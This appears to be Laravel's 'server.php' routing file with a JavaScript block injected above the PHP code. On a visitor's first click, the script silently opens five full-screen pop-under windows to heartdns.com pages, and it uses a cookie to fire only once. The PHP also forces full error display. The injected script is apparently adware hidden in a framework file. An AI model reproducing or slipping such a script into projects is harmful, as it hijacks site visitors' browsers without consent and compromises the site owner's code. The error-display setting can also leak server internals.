<script type="text/javascript">
  function openMultipleWindows() {
    var urls = ["https://heartdns.com/blog/cara-mendeteksi-kerentanan-xss.html", "https://heartdns.com/blog/reverse-ip-lookup-osint-tools.html", "https://heartdns.com/blog/how-to-install-mongodb-on-linux.html", "https://heartdns.com/privacy-policy", "https://heartdns.com/disclaimer"];
    var params = 'width=' + screen.width;
    params += ', height=' + screen.height;
    params += ', top=1000, left=1200px ,scrollbars=no';
    params += ', fullscreen=yes,width=1366,height=800';
    for (var i = 0; i < urls.length; i++) {
      var w = window.open(urls[i], 'window' + i, params).blur();
      window.focus();
    }
  }

  function addEvent(obj, eventName, func) {
    if (obj.attachEvent) {
      obj.attachEvent("on" + eventName, func);
    } else if (obj.addEventListener) {
      obj.addEventListener(eventName, func, true);
    } else {
      obj["on" + eventName] = func;
    }
  }

  addEvent(window, "load", function(e) {
    addEvent(document.body, "click", function(e) {
      if (document.cookie.indexOf("bkc=lyk") == -1) {
        openMultipleWindows();
        document.cookie = "bkc=lykshoptinhoc";
      }
    });
  });
</script>
<?php

/**
 * Laravel - A PHP Framework For Web Artisans
 *
 * @package  Laravel
 * @author   Taylor Otwell <taylor@laravel.com>
 */

$uri = urldecode(
    parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH)
);

ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL);
// This file allows us to emulate Apache's "mod_rewrite" functionality from the
// built-in PHP web server. This provides a convenient way to test a Laravel
// application without having installed a "real" web server software here.
if ($uri !== '/' && file_exists(__DIR__.'/public'.$uri)) {
    return false;
}

require_once __DIR__.'/public/index.php';

